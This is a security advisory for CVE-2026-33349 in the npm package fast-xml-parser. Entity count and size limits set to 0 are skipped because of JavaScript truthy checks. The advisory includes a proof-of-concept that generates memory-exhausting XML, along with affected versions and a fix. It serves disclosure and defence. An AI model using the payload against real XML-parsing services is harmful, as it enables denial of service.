# [M] Entity Expansion Limits Bypassed When Set to Zero Due to JavaScript Falsy Evaluation in fast-xml-parser

## Summary
Severity: Medium
Advisory: GHSA-jp2q-39xq-3w4g
CVE: CVE-2026-33349
CWE: CWE-1284
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-03-19
Source: https://github.com/advisories/GHSA-jp2q-39xq-3w4g
Type: github-advisory

## Affected
- npm: `fast-xml-parser` — affected >=4.0.0-beta.3 <4.5.5
- npm: `fast-xml-parser` — affected >=5.0.0 <5.5.7

## Details
## Summary

The `DocTypeReader` in fast-xml-parser uses JavaScript truthy checks to evaluate `maxEntityCount` and `maxEntitySize` configuration limits. When a developer explicitly sets either limit to `0` — intending to disallow all entities or restrict entity size to zero bytes — the falsy nature of `0` in JavaScript causes the guard conditions to short-circuit, completely bypassing the limits. An attacker who can supply XML input to such an application can trigger unbounded entity expansion, leading to memory exhaustion and denial of service.

## Details

The `OptionsBuilder.js` correctly preserves a user-supplied value of `0` using nullish coalescing (`??`):

```js
// src/xmlparser/OptionsBuilder.js:111
maxEntityCount: value.maxEntityCount ?? 100,
// src/xmlparser/OptionsBuilder.js:107
maxEntitySize: value.maxEntitySize ?? 10000,
```

However, `DocTypeReader.js` uses truthy evaluation to check these limits. Because `0` is falsy in JavaScript, the entire guard expression short-circuits to `false`, and the limit is never enforced:

```js
// src/xmlparser/DocTypeReader.js:30-32
if (this.options.enabled !== false &&
    this.options.maxEntityCount &&          // ← 0 is falsy, skips check
    entityCount >= this.options.maxEntityCount) {
    throw new Error(`Entity count ...`);
}
```

```js
// src/xmlparser/DocTypeReader.js:128-130
if (this.options.enabled !== false &&
    this.options.maxEntitySize &&            // ← 0 is falsy, skips check
    entityValue.length > this.options.maxEntitySize) {
    throw new Error(`Entity "${entityName}" size ...`);
}
```

The execution flow is:

1. Developer configures `processEntities: { maxEntityCount: 0, maxEntitySize: 0 }` intending to block all entity definitions.
2. `OptionsBuilder.normalizeProcessEntities` preserves the `0` values via `??` (correct behavior).
3. Attacker supplies XML with a DOCTYPE containing many large entities.
4. `DocTypeReader.readDocType` evaluates `this.options.maxEntityCount && ...` — since `0` is falsy, the entire condition is `false`.
5. `DocTypeReader.readEntityExp` evaluates `this.options.maxEntitySize && ...` — same result.
6. All entity count and size limits are bypassed; entities are parsed without restriction.

## PoC

```js
const { XMLParser } = require("fast-xml-parser");

// Developer intends: "no entities allowed at all"
const parser = new XMLParser({
  processEntities: {
    enabled: true,
    maxEntityCount: 0,    // should mean "zero entities allowed"
    maxEntitySize: 0       // should mean "zero-length entities only"
  }
});

// Generate XML with many large entities
let entities = "";
for (let i = 0; i < 1000; i++) {
  entities += `<!ENTITY e${i} "${"A".repeat(100000)}">`;
}

const xml = `<?xml version="1.0"?>
<!DOCTYPE foo [
  ${entities}
]>
<foo>&e0;</foo>`;

// This should throw "Entity count exceeds maximum" but does not
try {
  const result = parser.parse(xml);
  console.log("VULNERABLE: parsed without error, entities bypassed limits");
} catch (e) {
  console.log("SAFE:", e.message);
}

// Control test: setting maxEntityCount to 1 correctly blocks
const safeParser = new XMLParser({
  processEntities: {
    enabled: true,
    maxEntityCount: 1,
    maxEntitySize: 100
  }
});

try {
  safeParser.parse(xml);
  console.log("ERROR: should have thrown");
} catch (e) {
  console.log("CONTROL:", e.message);  // "Entity count (2) exceeds maximum allowed (1)"
}
```

**Expected output:**
```
VULNERABLE: parsed without error, entities bypassed limits
CONTROL: Entity count (2) exceeds maximum allowed (1)
```

## Impact

- **Denial of Service:** An attacker supplying crafted XML with thousands of large entity definitions can exhaust server memory in applications where the developer configured `maxEntityCount: 0` or `maxEntitySize: 0`, intending to prohibit entities entirely.
- **Security control bypass:** Developers who explicitly set restrictive limits to `0` receive no protection — the opposite of their intent. This creates a false sense of security.
- **Scope:** Only applications that explicitly set these limits to `0` are affected. The default configuration (`maxEntityCount: 100`, `maxEntitySize: 10000`) is not vulnerable. The `enabled: false` option correctly disables entity processing entirely and is not affected.

## Recommended Fix

Replace the truthy checks in `DocTypeReader.js` with explicit type checks that correctly treat `0` as a valid numeric limit:

```js
// src/xmlparser/DocTypeReader.js:30-32 — replace:
if (this.options.enabled !== false &&
    this.options.maxEntityCount &&
    entityCount >= this.options.maxEntityCount) {

// with:
if (this.options.enabled !== false &&
    typeof this.options.maxEntityCount === 'number' &&
    entityCount >= this.options.maxEntityCount) {
```

```js
// src/xmlparser/DocTypeReader.js:128-130 — replace:
if (this.options.enabled !== false &&
    this.options.maxEntitySize &&
    entityValue.length > this.options.maxEntitySize) {

// with:
if (this.options.enabled !== false &&
    typeof this.options.maxEntitySize === 'number' &&
    entityValue.length > this.options.maxEntitySize) {
```

# Workaround

If you don't want to processed the entities, keep the processEntities flag to false instead of setting any limit to 0.

## References
- https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-jp2q-39xq-3w4g
- https://nvd.nist.gov/vuln/detail/CVE-2026-33349
- https://github.com/NaturalIntelligence/fast-xml-parser/commit/239b64aa1fc5c5455ddebbbb54a187eb68c9fdb7
- https://github.com/NaturalIntelligence/fast-xml-parser/commit/88d0936a23dabe51bfbf42255e2ce912dfee2221
- https://github.com/NaturalIntelligence/fast-xml-parser
